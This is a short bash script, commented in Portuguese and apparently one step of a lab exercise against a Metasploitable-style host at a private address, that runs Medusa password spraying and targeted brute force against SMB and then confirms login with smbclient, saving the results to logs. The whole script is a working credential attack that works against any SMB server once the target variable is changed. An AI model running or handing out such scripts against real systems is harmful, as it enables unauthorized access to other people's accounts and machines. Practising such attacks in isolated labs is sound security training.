#!/usr/bin/env bash
# 04 — Password spraying e força bruta direcionada em SMB com Medusa.
set -uo pipefail
TARGET="${TARGET:-192.168.56.102}"
BASE="$(cd "$(dirname "$0")/.." && pwd)"
cd "$BASE"
mkdir -p logs

echo "== Password spraying: uma senha ('msfadmin') contra vários usuários =="
medusa -h "$TARGET" \
  -U wordlists/users-smb.txt \
  -p msfadmin \
  -M smbnt -t 1 -f \
  -O logs/04-smb-spray.log \
  2>&1 | tee logs/04-smb-spray-console.txt

echo
echo "== Força bruta direcionada: usuário msfadmin x lista de senhas =="
medusa -h "$TARGET" \
  -u msfadmin \
  -P wordlists/passwords.txt \
  -M smbnt -t 1 -f \
  -O logs/04-smb-brute.log \
  2>&1 | tee logs/04-smb-brute-console.txt

echo
echo "== Validação do acesso SMB =="
smbclient "//$TARGET/tmp" -U 'msfadmin%msfadmin' -c 'ls' \
  2>&1 | tee logs/04-smb-validacao.txt
